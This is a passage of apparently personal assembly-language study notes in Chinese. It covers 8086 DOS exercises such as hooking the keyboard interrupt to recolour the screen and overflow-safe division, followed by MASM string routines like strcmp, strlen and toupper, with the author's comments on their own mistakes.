ds,ax mov si, offset do7ch_start mov ax,0 mov es,ax mov di,200h mov cx,offset do7ch_end - offset do7ch_start cld rep movsb mov word ptr es:[7ch*4+0],200h mov word ptr es:[7ch*4+2],0 ret do7ch_start: dec cx jcxz retend mov bp,0 push bp mov bp,sp sub ss:[bp+2],bx pop bp retend: iret do7ch_end:nop code endsend start 输出4句诗1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556assume cs:code , ss:stack stack segment db 16 dup(&#x27;0&#x27;)stack endscode segment s1: db &quot;Good,better,best&quot;,&#x27;,&#x27;,&#x27;$&#x27; s2: db &quot;Never let it rest&quot;,&#x27;,&#x27;,&#x27;$&#x27; s3: db &quot;Till good is bettre&quot;,&#x27;,&#x27;,&#x27;$&#x27; s4: db &quot;And better ,best.&quot;,&#x27;,&#x27;,&#x27;$&#x27; s: dw offset s1, offset s2, offset s3, offset s4 row: db 2,4,6,8start: mov ax,stack mov ss,ax mov sp,16 mov ax,cs mov ds,ax mov bx,offset s mov si,offset row mov cx,4 ok: mov ah,2;2函数 mov bh,0;0页 ;mov dh,byte ptr ds:[si] ;si+=2;第某某行 mov dh,cs:[si] mov dl,10 int 10h ;mov dx,bx mov dx,cs:[bx] mov ah,9 int 21h add bx,2 inc si loop ok mov ax,4c00h int 21h mov ax,4c00h int 21h code endsend start 用int9打印一首五颜六色的情诗123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123assume cs:code,ss:stack,ds:datastack segment db 32 dup(&#x27;S&#x27;)stack endsdata segment db 16 dup(&#x27;D&#x27;) db &quot;How do I love you? Let me count the ways.&quot;,0 db &quot;I love you to the depth and breath and height.&quot;,0 db &quot;My soul can reach ,when feeling out sight.&quot;,0 db &quot;For the ends of being and ideal Grace.&quot;,0 db &quot;I love you to the level of ideal everyday&#x27;s.&quot;,0 db &quot;Most quiet need,by sun and candlelight.&quot;,0data endscode segmentrow: db 10,11,12,13,14,15start: mov ax,data mov ds,ax mov ax,stack mov ss,ax mov sp,32 mov ax,0b800h mov es,ax ;--------------------------------------- call init_9h ;--------------------------------------- mov cx,6;有6句诗 mov si,16;si指向字符串开始位置 mov bx,offset row;记住bx指针,而不是指向的值 mov dh,2;它是颜色,因为dx很少用,避免冲突,我们就取dx ;--------------------------------============ k: call show_str; loop k ;----------------把键盘的控制权还给int9 mov ax,0 mov es,ax push ds:[0] pop es:[9*4+0] push ds:[2] pop es:[9*4+2] ;------------------------------------ mov ax,4c00h int 21h init_9h: ;修改的位置指向0000:9*4 push es mov ax,0 mov es,ax ;保存一下以前的int9,后面我们还要调用 push es:[9*4+0] pop ds:[0] push es:[9*4+2] pop ds:[2] ;DIY一下int9,让它的中断向量表发生一些变化 mov word ptr es:[9*4+0],offset start_9h mov es:[9*4+2],cs pop es ret ;DIY的int9长这样 start_9h: in al,60h;呼叫端口,我们的键入都在端口那里,al接收了我们的键入 pushf;模拟int9的入栈 call dword ptr ds:[0];模拟int9的入栈 cmp al,48h;如果键入是 ↑ jne start_9h_end;不是就退出 inc dh;就修改颜色 start_9h_end: iret show_str: mov al,160;每一行160 mul byte ptr cs:[bx];每一行x那个行数,bx是指针,bx+=2 mov di,ax;然目的地址接收结果 add di,20*2;指向20列 show_str_sontinue: mov dl,ds:[si];si指针指针指向了字符串 cmp dl,0;如果是0,就退出,然后+1,跳过0,指向下一个字符串 je show_end call delay;缓冲一下 mov es:[di],dx add di,2;指向下一个像素 inc si;指向下一个字符 jmp show_str_sontinue;继续循环 show_end: inc bx;指向下一行 inc si;跳过0 ret delay: push ax push bx mov ax,0 mov bx,01h delay_continue: sub ax,1 sbb bx,0 cmp ax,0 jne delay_continue cmp bx,0 jne delay_continue pop bx pop ax retcode endsend start 在代码据放data segment的坏处好处? 就是寻址很方便,因为代码区,你可以用指令offset来寻址, 但就问题就存在 1234567mov bx,offset s1mov si,offset s2...mov dx,cs:[bx]...mov dh,cs:[si]...... 可以在上面看到其实也没啥&#x2F;… 但是cs:[],你&#96;只能用纯数字,bx寄存器,ip,si,di&#96;,,…si,di有重要的用途,,,,,ip无法用…..bx有太少 安装DIY的int9中断,然后运行,,,可以修改屏幕的颜色12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273assume cs:code,ss:stackstack segment db 32 dup(&#x27;S&#x27;)stack endscode segmentstart: mov ax,stack mov ss,ax mov sp,32 push cs pop ds mov si,offset int9 mov ax,0 mov es,ax mov di,204h mov cx,offset int9_end - offset int9 cld rep movsb push es:[9*4+0] pop es:[200h+0] push es:[9*4+2] pop es:[200h+2] cli mov word ptr es:[9*4+0],204h mov word ptr es:[9*4+2],0 sti mov ax,4c00h int 21h int9: push ax push bx push cx push es in al,60h pushf call dword ptr cs:[200h];调用int 9的中断 cmp al,48h;F1--&gt;3bh jne int9ret mov ax,0b800h mov es,ax mov bx,1 mov cx,2000 s: inc byte ptr es:[bx] add bx,2 loop s int9ret: pop es pop cx pop bx pop ax iret int9_end: nopcode endsend start 运行之后你就可以按一下 自己写了一遍..发现了很多的问题①. 程序没有不接收.你没有mov ax,4c00h;int 21h ②. 对原有的中断向量表做了保存却不去修改原有的向量表 ③. 我们是先键入,再调用int9去 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879assume cs:code,ss:stack,ds:datastack segment db 128 dup(&#x27;S&#x27;)stack endsdata segment db 128 dup(&#x27;D&#x27;)data endscode segmentstart: mov ax,stack mov ss,ax mov sp,128 mov ax,cs mov ds,ax mov si,offset init_int9 mov ax,0 mov es,ax mov di,204h mov cx , offset init_int9_end - offset init_int9 cld rep movsb push es:[9*4+0] pop es:[200h+0] push es:[9*4+2] pop es:[200h+2] cli mov word ptr es:[9*4],204h mov word ptr es:[9*4+2],0 sti mov ax,4c00h int 21h init_int9: push ax push es push bx push cx in al,60h ;是先发生键入,再调用外中断 pushf call dword ptr cs:[200h];这里有个问题,如果mov ax,0 mov ds,ax call word ptr ds:[200h]就没有用 cmp al,48h jne int9_ret mov ax,0b800h mov es,ax mov bx,1 mov cx,2000 change_screen: inc byte ptr es:[bx] add bx,2 loop change_screen int9_ret: pop cx pop bx pop es pop ax iret init_int9_end:nop code endsend start 教材实验 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384assume cs:code,ss:stackstack segment db 32 dup(&#x27;S&#x27;)stack endscode segmentstart: mov ax,stack mov ss,ax mov sp,32 push cs pop ds mov si,offset int9 mov ax,0 mov es,ax mov di,204h mov cx,offset int9_end - offset int9 cld rep movsb push es:[9*4+0] pop es:[200h+0] push es:[9*4+2] pop es:[200h+2] cli mov word ptr es:[9*4+0],204h mov word ptr es:[9*4+2],0 sti mov ax,4c00h int 21h int9: push ax push bx push cx push es ;in al,60h ;pushf ;call dword ptr cs:[200h];调用int 9的中断 ;cmp al,3bh;F1--&gt;3bh ;jne int9ret ;它探测的是你的断码..不是同码....因此就不用再去2次call int9 in al,60h pushf call dword ptr cs:[200h] cmp al,3bh+80h jne int9ret show: mov ax,0b800h mov es,ax mov bx,1 mov cx,1000 s: inc byte ptr es:[bx] mov byte ptr es:[bx-1],&#x27;?&#x27; add bx,2 loop s int9ret: pop es pop cx pop bx pop ax iret int9_end: nopcode endsend start DIY中断安装,执行4个函数的功能出了很多的错 还是那些问题 ①. 对整个代码的思路不是很清晰….老师写了一半发现自己写乱了..思路不明确 ②. 提取了原有的中断到一定的位置去,却不修改原有的中断&#x3D;&#x3D;没有修改中断 ③. call far ptr但是错用ret..导致堆栈错误….不平衡 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289assume cs:code,ss:stack,ds:datastack segment db 32 dup(&#x27;S&#x27;)stack endsdata segment db 32 dup(&#x27;D&#x27;)data endscode segmentstart: mov ax,stack mov ss,ax ;对整个代码的思路不是很清晰….老师写了一半发现自己写乱了..思路不明确 call init_int9 mov ax,4c00h int 21h init_int9: mov ax,0 mov ds,ax push ds:[4*9+0] pop ds:[200h] push ds:[4*9+2] pop ds:[202h] ;提取了原有的中断到一定的位置去,却不修改原有的中断==没有修改中断 cli mov word ptr ds:[4*9+0],200h mov word ptr ds:[4*9+2],0 sti ;源地址 push cs pop ds mov si,offset copy_start ;目的地址 mov ax,0 mov es,ax mov di,204h ;循环次数 mov cx,offset copy_end - offset copy_start cld rep movsb ret copy_start: ;担心害怕就把所有的寄存器给备份 pushf push ax push bx push cx push dx push ds push si push es push di ;获取扫描码 in al,60h pushf call dword ptr cs:[200h] cmp al,2h;把扫描码与通码比较 je set0 cmp al,3h; je set1 cmp al,4h;2 je set2 cmp al,5h;3 je set3 jmp real_ret set0: mov ah,0 jmp do9_ret set1: mov ah,1 jmp do9_ret set2: mov ah,2 jmp do9_ret set3: mov ah,3 jmp do9_ret do9_ret: call setscreen ;call far ptr但是错用ret..导致堆栈错误….不平衡 real_ret: pop di pop es pop si pop ds pop dx pop cx pop bx pop ax popf iret ;做一个屏幕的清理 ------------------ ;初始会配置 setscreen: push ax cmp ah,0 je do1 cmp ah,1 je do2 cmp ah,2 je do3 cmp ah,3 je do4 jmp sret do1: call sub1 jmp short sret do2: call sub2 jmp short sret do3: call sub3 jmp short sret do4: call sub4 jmp short sret sret: pop ax ret sub1: push bx push cx push es mov bx,0b800h mov es,bx mov bx,0 mov cx,2000 subls: mov byte ptr es:[bx],&#x27; &#x27; mov byte ptr es:[bx+1],0 add bx,2 loop subls pop es pop cx pop bx ret ;设置前景色------------------- sub2: push bx push cx push es push ax mov bx,0b800h mov es,bx mov bx,1 mov cx,2000 sub2s: push cx mov al,byte ptr es:[bx] mov ah,al mov cl,4 ;头4位 shr al,cl inc al shl al,cl shl ah,cl shr ah,cl or al,ah mov byte ptr es:[bx],al add bx,2 pop cx loop sub2s pop ax pop es pop cx pop bx ret ;设置背景色---------------------------- sub3: push bx push cx push es push ax mov bx,0b800h mov es,bx mov bx,1 mov cx,2000 sub3s: push cx mov al,byte ptr es:[bx] mov ah,al mov cl,4 ;后4位 ;我是u怎么发现问题的???? ;还是对位运算不理解呀.... shl al,cl shr al,cl inc al shr ah,cl shl ah,cl or al,ah ;mov al,11001010b;我是怎么发现问题的?????对里面的参数去做修改,然后看发生了什么变化 mov byte ptr es:[bx],al add bx,2 pop cx loop sub3s pop ax pop es pop cx pop bx ret sub4: push cx push si push di push es push ds mov si,0b800h mov es,si mov ds,si mov si,160;指向[1]第二行 mov di,0;指向[0]第一行 cld mov cx,24;指向[24]最后一行 ;处理1行来上移 sub4s: push cx mov cx,160 rep movsb pop cx loop sub4s mov cx,80 mov si,0 ;最后一行置空 sub4s1: mov byte ptr [160*24+si],&#x27;?&#x27; mov byte ptr [160*24+si+1],0 add si,2 loop sub4s1 pop ds pop es pop di pop si pop cx ret copy_end: nopcode endsend start 如何让做到inc每个配置?????????????? 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275assume cs:code,ss:stack,ds:datastack segment db 32 dup(&#x27;S&#x27;)stack endsdata segment db 32 dup(&#x27;D&#x27;)data endscode segmentstart: mov ax,stack mov ss,ax call init_int9 mov ax,4c00h int 21h init_int9: mov ax,0 mov ds,ax push ds:[4*9+0] pop ds:[200h] push ds:[4*9+2] pop ds:[202h] ;错误② cli mov word ptr ds:[4*9+0],200h mov word ptr ds:[4*9+2],0 sti ;源地址 push cs pop ds mov si,offset copy_start ;目的地址 mov ax,0 mov es,ax mov di,204h ;循环次数 mov cx,offset copy_end - offset copy_start cld rep movsb ret copy_start: ;担心害怕就把所有的寄存器给备份 pushf push ax push bx push cx push dx push ds push si push es push di ;获取扫描码 in al,60h pushf call dword ptr cs:[200h] cmp al,2;把扫描码与通码比较 je set0 cmp al,3; je set1 cmp al,4;2 je set2 cmp al,5;3 je set3 jmp real_ret set0: mov ah,0 jmp do9_ret set1: mov ah,1 ;mov al,00000010b jmp do9_ret set2: mov ah,2 ;mov al,10100000b jmp do9_ret set3: mov ah,2 jmp do9_ret do9_ret: call setscreen real_ret: pop di pop es pop si pop ds pop dx pop cx pop bx pop ax popf iret ;做一个屏幕的清理 ------------------ ;初始会配置 setscreen: cmp ah,0 je do1 cmp ah,1 je do2 cmp ah,2 je do3 cmp ah,3 je do4 jmp sret do1: call sub1 jmp short sret do2: call sub2 jmp short sret do3: call sub3 jmp short sret do4: call sub4 sret: ret sub1: push bx push cx push es mov bx,0b800h mov es,bx mov bx,0 mov cx,2000 subls: mov byte ptr es:[bx],&#x27; &#x27; or byte ptr es:[bx+1],0 add bx,2 loop subls pop es pop cx pop bx ret ;设置前景色------------------- sub2: push bx push cx push es push ax mov bx,0b800h mov es,bx mov bx,1 mov cx,2000 sub2s: push cx mov al,byte ptr es:[bx] mov ah,al mov cl,4 ;头4位 shr al,cl inc al shl al,cl shl ah,cl shr ah,cl or al,ah mov byte ptr es:[bx],al add bx,2 pop cx loop sub2s pop ax pop es pop cx pop bx ret ;设置背景色---------------------------- sub3: push bx push cx push es push ax mov bx,0b800h mov es,bx mov bx,1 mov cx,2000 sub3s: push cx mov al,byte ptr es:[bx] mov ah,al mov cl,4 ;后4位 shl al,cl inc al shr al,cl shr ah,cl shl ah,cl or al,ah mov byte ptr es:[bx],al add bx,2 pop cx loop sub3s pop ax pop es pop cx pop bx ret sub4: push cx push si push di push es push ds mov si,0b800h mov es,si mov ds,si mov si,160;指向[1]第二行 mov di,0;指向[0]第一行 cld mov cx,24;指向[24]最后一行 ;处理1行来上移 sub4s: push cx mov cx,160 rep movsb pop cx loop sub4s mov cx,80 mov si,0 ;最后一行置空 sub4s1: mov byte ptr [160*24+si],&#x27;?&#x27; mov byte ptr [160*24+si+1],0 add si,2 loop sub4s1 pop ds pop es pop di pop si pop cx ret copy_end: nopcode endsend start 8086CPU-&gt;div的Interger_over_flow解决方案这里系统自动把结果的低16位给了ax 我们人为的把结果的高16位给了dx 人为的把余数放在cx中 使得溢出的数据不再丢失 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源Sdata segment dd 1234567 ;87 D6 12 00data ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack ends;=======================================================code segmentstart: ;main code ;======================================================= ;数据源S mov ax,data mov ds,ax mov si,0 mov bx,0 ;数据地D mov ax,7e00h mov es,ax mov di,0 ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= call div_number over: mov ax,4c00h int 21h;======================================================= ;functiondiv_number: ;87 D6 12 00 0x0012D687 mov ax,ds:[0] ;0xD687 mov dx,ds:[2] ;0x0012 mov cx,10 push ax ;push 0xD687 mov bp,sp ;取bp,自动向下获取数据 call long_div add sp,2 retlong_div: mov ax,dx ;ax=高8位 mov dx,0 ;dx=0,避免干扰 div cx ; push ax ;把高位的数据保存一下,余数作为低位除法的高位 mov ax,ss:[bp] ;bp记录了低8位原始数据的地址,ax=低8位 div cx ; mov cx,dx ;我们自定义把最后的余数给了cx pop dx ;把溢出的数据给了dx ret;======================================================= code endsend start;======================================================= 例子就是 自我尝试 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465;=======================================================assume cs:code , ds:data, ss:stack;=======================================================;数据源Sdata segment dd 1234567data ends ;=======================================================;栈段stack segment stack db 128 dup(&#x27;y&#x27;)stack ends;=======================================================code segmentstart: ;main code ;======================================================= ;数据源S mov ax,data mov ds,ax mov si,0 mov bx,0 ;数据地D mov ax,7e00h mov es,ax mov di,0 ;栈 mov ax,stack mov ss,ax mov sp,128 ;======================================================= mov ax,ds:[0] mov dx,ds:[2] mov cx,10 push ax mov bp,sp mov ax,dx mov dx,0 div cx push ax mov ax,ss:[bp] div cx mov cx,dx pop dx add sp,2;堆栈的平衡over: mov ax,4c00h int 21h;======================================================= ;function ;======================================================= code endsend start;======================================================= 它背后的思想是什么? 把数据大数化小,然后一句不变的性质取解除答案 再次书写出现的问题 1.老是忘记mov dx,0 2.add sp,2没有加对位置 3.对于ASCII的打印还不是很理解 x86 课堂代码复制字符串我的 12345678910111213141516171819202122232425262728title Dqx_Gh0st.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD\t.data\tarr1 db &quot;hello,I am dqx_Gh0st&quot;,0\tarr2 db sizeof arr1 dup(0).codemain PROC xor eax,eax mov ecx ,sizeof arr1 mov esi , offset arr1 mov edi, offset arr2add_num: mov al,[esi] mov [edi],al inc\tesi inc\tedi loop add_num INVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- main ENDPEND main 书上的 12345678 xor eax,eax mov ecx ,sizeof arr1 mov esi , 0add_num: mov al,arr1[esi] mov arr2[esi],al inc\tesi loop add_num 逆序字符串,IDA无法调试,xdebug可以123456789101112131415161718192021222324252627282930313233343536title Dqx_Gh0st.386.MODEL flat,stdcallExitProcess PROTO, dwExitCode:DWORD\t.stack 128.data\tarr1\tBYTE &quot;I am Dqx_Gh0st!&quot;,0\tlen=($-arr1)-1\tarr2 db len dup (0).codemain PROC xor eax,eax mov ecx,len mov esi,offset arr1 push_str: mov al,byte ptr [esi] push ax inc esi loop push_str mov ecx,len mov edi,offset arr2 pop_str: pop ax mov byte ptr [edi],al inc edi loop pop_str INVOKE\tExitProcess,0;--------------------------------------------------------------------------- main ENDPEND main strcmp 汇编版-无高级调用2个比较的字符串数据长度不一致 1️⃣.结果肯定是不相等 2️⃣.我们还是在小的范围里面比较一下 比较情况 1️⃣.数据尺度一致,一直比较到字符串不相等的地方 2️⃣.数据尺度不一致 在前面长度内,他们的数据都一样,导致ZF一直为1,如果你通过检测到0而采取退出的话,最后的ZF就还是1,而逻辑上的ZF&#x3D;0,毕竟他们不相等 因此,就算我们检测到0,也还是要比较一下,除非2个字符串都检测到0,说明前面都相等,后面也就0,0自然也相等 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- A1\tdb\t&quot;abcdABCD&quot;,0B1\tdb\t&quot;abcdabcd&quot;,0len\tdd\tlengthof A1;-------------------------------------------------------- ;function;--------------------------------------------------------strcmp proto :ptr byte,:ptr byte;-------------------------------------------------------- .code;--------------------------------------------------------start: invoke\tstrcmp,addr A1,addr B1over:\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------strcmp proc uses eax edx esi edi,str1:ptr byte,str2:ptr byte mov esi, str1 mov edi, str2check_continue: mov al, [esi] mov dl, [edi] cmp al, 0 jne check cmp dl, 0 jne check ;上面2个cmp操作 ;当最后字符串末尾都是0就不再检查 ;如果其中一个是0,另外一个不是0,那么cmp一下,肯定不相等 jmp no_check check: cmp al,dl pushfd inc esi inc edi popfd je check_continueno_check: ret strcmp endp;--------------------------------------------------------end\tstart;-------------------------------------------------------- inc会影响ZF寄存器,woc strlen 汇编版-无高级调用12345678910111213141516171819202122232425262728293031323334353637383940include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- A1\tdb\t&quot;abcd&quot;,0B1\tdb\t&quot;abcdabcd&quot;,0len\tdd\tlengthof A1;-------------------------------------------------------- ;function;--------------------------------------------------------strlen proto :ptr byte;-------------------------------------------------------- .code;--------------------------------------------------------start: invoke\tstrlen,addr A1over:\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------strlen proc uses edi,pStr:ptr byte mov edi, pStr mov eax, 0 check_continue: cmp byte ptr [edi],0 je check_end inc edi inc eax jmp check_continuecheck_end: retstrlen endp;--------------------------------------------------------end\tstart;-------------------------------------------------------- 有输入的strlen值得注意的是,scanf遇到输入空格就会停止,所以你在键入的时候,就不要输入空格 12345678910111213141516171819202122232425262728293031323334;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;include Dqx.incprintf proto C :ptr sbyte,:varargscanf proto C :ptr sbyte,:vararg;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data .dataarr\tdb\t128 dup(0)in_fmt\tdb\t&quot;%s&quot;,0out_fmt db\t&quot;%d&quot;,0;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .code start: invoke scanf,offset in_fmt, offset arr mov al,0 lea edi,arr mov ecx,10 cld repne scasb dec edi lea eax,arr sub edi,eax invoke\tprintf,addr out_fmt,edi invoke\tExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end\tstart strcpy 汇编版-无高级调用12345678910111213141516171819202122232425262728293031323334353637383940include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- A1\tdb\t&quot;Dqx&quot;,0len\t=\tlengthof A1B1\tdb\tlen dup (0);-------------------------------------------------------- ;function;--------------------------------------------------------Strcopy proto source:PTR BYTE, target:PTR BYTE ;-------------------------------------------------------- .code;--------------------------------------------------------start: invoke\tStrcopy ,addr A1,addr B1over:\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------;--------------------------------------Strcopy PROC USES eax ecx esi edi, source:PTR BYTE, ; source string target:PTR BYTE ; target string;将字符串从源串复制到目的串。;要求：目标串必须有足够空间容纳从源复制来的串。;-------------------------------------- mov ecx,len mov esi, source mov edi, target cld ; rep movsb retStrcopy ENDP;--------------------------------------------------------end\tstart;-------------------------------------------------------- strtrim 删除末尾特定的字符就一个字符串,假设末尾有字符”#”,然后我们就把它删除 这个函数的巧妙之处就是它是从后面开始遍历的,而不是从头开始 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- A1\tdb\t&quot;Dqx##&quot;,0len\t=\tlengthof A1B1\tdb\tlen dup (0);-------------------------------------------------------- ;function;--------------------------------------------------------Strtrim proto source:PTR BYTE, : BYTE ;-------------------------------------------------------- .code;--------------------------------------------------------start: invoke\tStrtrim ,addr A1,&quot;#&quot;\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------;Str_trim;从字符串末尾删除所有与给定分隔符匹配的字符。;返回：无;-------------------------------------Strtrim PROC USES eax ecx edi,\tpStr:PTR BYTE, char: BYTE mov edi,pStr mov eax,len-1 ;我们用len计算的长度是+上了最后一个字节了的 cmp eax,0 ;长度为0,就结束这里的bug就是长度为0,0-1=无符号的大数 je\tover mov ecx, eax dec eax add edi,eax\t;让inde指向最后一个 check_continue:\tmov al, [edi] cmp al,char jne get_it dec edi loop check_continue get_it: mov BYTE PTR [edi+1 ],0 over:\tretStrtrim ENDP;--------------------------------------------------------end\tstart;-------------------------------------------------------- toupper 字符串大写话123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- A1\tdb\t&quot;I_am_Dqx_Gh0st&quot;,0len\t=\tlengthof A1B1\tdb\tlen dup (0);-------------------------------------------------------- ;function;--------------------------------------------------------toupper proto source:PTR BYTE;-------------------------------------------------------- .code;--------------------------------------------------------start: invoke\ttoupper ,addr A1\tinvoke\tExitProcess,NULL;--------------------------------------------------------;function;--------------------------------------;Str_trim;从字符串末尾删除所有与给定分隔符匹配的字符。;返回：无;-------------------------------------;---------------------------------;Str_ucase;将空字节结束的字符串转换为大写字母。;返回：无;---------------------------------toupper proc uses eax esi,\tpStr:PTR BYTE\tmov esi,pStrwork:\tmov al, [esi] ;取字符\tcmp al, 0 ;字符串是否结束？\tje over ;是：退出\tcmp al, &#x27;a&#x27; ;小于&quot;a&quot; ？\tjb next\tcmp al, &#x27;z&#x27; ;大于&quot;z&quot; ？\tja next\tand byte ptr [esi], 11011111b ;转换字符next: inc esi ;下一个字符\tjmp workover:\trettoupper endp;--------------------------------------------------------end\tstart;-------------------------------------------------------- tolower 字符串小写化123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051include Dqx.inc;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; .data;-------------------------------------------------------- 